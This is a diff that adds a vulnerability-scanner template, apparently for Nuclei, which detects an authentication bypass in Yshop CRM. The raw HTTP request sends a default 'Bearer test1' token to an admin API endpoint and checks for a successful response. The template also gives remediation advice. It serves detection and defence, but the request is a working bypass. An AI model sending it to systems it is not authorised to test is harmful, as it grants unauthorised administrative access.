@@ -1,0 +1,49 @@
+id: yshop-crm-default-authorization-token-bypass
+
+info:
+  name: Yshop CRM默认Authorization令牌认证绕过漏洞
+  author: qwtd
+  severity: high
+  description: |
+    Yshop CRM系统存在认证绕过漏洞，根源在于对Authorization请求头的校验不严。攻击者可通过提供默认令牌值（如`Bearer test1`）在未提供有效凭据的情况下访问受保护的后端API接口。
+  impact: |
+    Successful exploitation allows unauthenticated attackers to access
+    administrative API endpoints and perform actions with authenticated
+    user privileges. Depending on the deployed permissions, this may
+    result in sensitive information disclosure, unauthorized operations,
+    and complete compromise of the management system.
+  remediation: |
+    Implement proper token validation and signature verification.
+    Reject default, hardcoded, or arbitrary Authorization values.
+    Ensure all protected endpoints validate token authenticity,
+    expiration, and user identity before granting access.
+  classification:
+    cwe-id: CWE-287
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:L
+    cvss-score: 9.1
+  metadata:
+    vendor: Yshop
+    product: CRM
+    verified: true
+  tags: YSHOP商城后台管理系统
+
+http:
+  - raw:
+      - |
+        GET /admin-api/system/notify-message/get-unread-count HTTP/1.1
+        Host: {{Hostname}}
+        Accept: application/json, text/plain, */*
+        Accept-Language: zh-CN,zh;q=0.9
+        Authorization: Bearer test1
+        Connection: close
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "code"
+          - "data"
+          - "msg"
+        condition: and
